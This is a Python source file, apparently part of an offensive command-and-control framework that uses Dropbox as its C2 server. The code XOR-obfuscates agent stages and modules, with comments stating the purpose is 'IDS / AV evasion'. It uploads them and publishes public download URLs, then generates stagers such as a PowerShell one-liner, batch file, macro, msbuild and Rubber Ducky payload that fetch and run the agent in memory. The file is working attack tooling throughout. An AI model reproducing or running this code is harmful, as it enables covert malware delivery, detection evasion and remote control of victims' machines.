# -*- coding: utf8 -*-
import config as cfg
from lib import helpers
from lib import stagers
from lib.crypto import Crypto

#****************************************************************************************
# Class handling main menu commands and interactions
#****************************************************************************************
class MainHandler:
	""" This class provides all functions used in the main menu
	"""

	#------------------------------------------------------------------------------------
	def __init__(self, dropboxHandler, statusHandler):
		self.dropboxHandler = dropboxHandler
		self.statusHandler = statusHandler
	
	#------------------------------------------------------------------------------------
	def publishStage(self, stageLocalPath, stageName):

		print helpers.color("[*] Publishing [{}] to the C2 server".format(stageLocalPath))
		remoteFilePath = "/" + stageName + ".aa"

		# Get a SHA256 hash value of the master key
		# (!!) : Because we use XOR for obfuscating the stage (not proper encryption, just for IDS / AV evasion),
		# it would not be wise to use the master key that is also used for end-to-end data encryption
		xorKey = Crypto.convertKey(self.statusHandler.masterKey, outputFormat = "sha256")

		# XOR Encrypt the agent stage file and then upload it to the C2 server
		try:
			with open(stageLocalPath) as agentFileHandle:
				r = self.dropboxHandler.putFile(remoteFilePath, Crypto.xor(bytearray(agentFileHandle.read()), xorKey))
				agentFileHandle.close()

				if r is None:
					return
				else:
					print helpers.color("[*] Agent stage XOR encrypted with key [{}] and successfully published".format(xorKey))
		except IOError:
			print helpers.color("[!] Could not open or read file [{}]".format(stageLocalPath))
			return		

		# Share the file with a public URL and retrieve the URL
		r = self.dropboxHandler.shareFile(remoteFilePath)

		if r is None:
			return

		# Get the public URL from the answer
		try:
			stageURL = r['url'].replace("dl=0","dl=1")
			self.statusHandler.addStage(stageName, stageURL)
			print helpers.color("[*] Stage successfully shared with public URL [{}]".format(stageURL))
		except KeyError:
			print helpers.color("[!] Error parsing JSON looking for 'url' entry")
			print helpers.color("[!] Stage has NOT been shared as a public URL")

	#------------------------------------------------------------------------------------
	def deletePublishedStage(self, stageName):

		stageFileName = "/" + stageName + ".aa"
		if self.dropboxHandler.deleteFile(stageFileName) is not None:
			self.statusHandler.removeStage(stageName)
			print helpers.color("[*] Published stage [{}] has been successfully deleted from C2 server".format(stageName))
		else:
			print helpers.color("[!] Error deleting published stage [{}] from C2 server".format(stageName))

	#------------------------------------------------------------------------------------
	def publishModule(self, moduleLocalPath, moduleName):

		print helpers.color("[*] Publishing [{}] to the C2 server".format(moduleLocalPath))
		remoteFilePath = "/" + moduleName + ".mm"

		# Get a SHA256 hash value of the master key
		# (!!) : Because we use XOR for obfuscating the stage (not proper encryption, just for IDS / AV evasion),
		# it would not be wise to use the master key that is also used for end-to-end data encryption
		xorKey = Crypto.convertKey(self.statusHandler.masterKey, outputFormat = "sha256")

		# XOR Encrypt the module and then upload it to the C2 server
		try:
			with open(moduleLocalPath) as moduleFileHandle:
				r = self.dropboxHandler.putFile(remoteFilePath, Crypto.xor(bytearray(moduleFileHandle.read()), xorKey))
				moduleFileHandle.close()

				if r is None:
					return
				else:
					print helpers.color("[*] Module XOR encrypted with key [{}] and successfully published".format(xorKey))
		except IOError:
			print helpers.color("[!] Could not open or read file [{}]".format(moduleLocalPath))
			return		

		# Share the file with a public URL and retrieve the URL
		r = self.dropboxHandler.shareFile(remoteFilePath)

		if r is None:
			return

		# Get the public URL from the answer
		try:
			moduleURL = r['url'].replace("dl=0","dl=1")
			self.statusHandler.addModule(moduleName, moduleURL)
			print helpers.color("[*] Module successfully shared with public URL [{}]".format(moduleURL))
		except KeyError:
			print helpers.color("[!] Error parsing JSON looking for 'url' entry")
			print helpers.color("[!] Stage has NOT been shared as a public URL")

	#------------------------------------------------------------------------------------
	def deletePublishedModule(self, moduleName):

		moduleFileName = "/" + moduleName + ".mm"
		if self.dropboxHandler.deleteFile(moduleFileName) is not None:
			self.statusHandler.removeModule(moduleName)
			print helpers.color("[*] Published module [{}] has been successfully deleted from C2 server".format(moduleName))
		else:
			print helpers.color("[!] Error deleting published module [{}] from C2 server".format(moduleName))


	#------------------------------------------------------------------------------------
	def genStager(self, stagerType, stageName):

		# These are the common parameters required by the various stager (powershell or other) script
		stagerParameters = { 'stagePublicURL': self.statusHandler.publishedStageList[stageName], 'xorKey': Crypto.convertKey(self.statusHandler.masterKey, outputFormat = "sha256"), 'masterKey': helpers.b64encode(self.statusHandler.masterKey), 'accessToken': self.dropboxHandler.token }
		
		genStager = stagers.GenStager(stagerParameters)

		# Generate a powershell one liner stager that downloads and execute the agent stage (exe) in memory
		if stagerType == "oneliner":
			print genStager.oneLiner()
			return
		elif stagerType == "batch":
			genStager.batch()
			return
		elif stagerType == "macro":
			genStager.macro()
			return
		elif stagerType == "msbuild":
			genStager.msbuild()
			return
		elif stagerType == "ducky":
			genStager.ducky()
			return
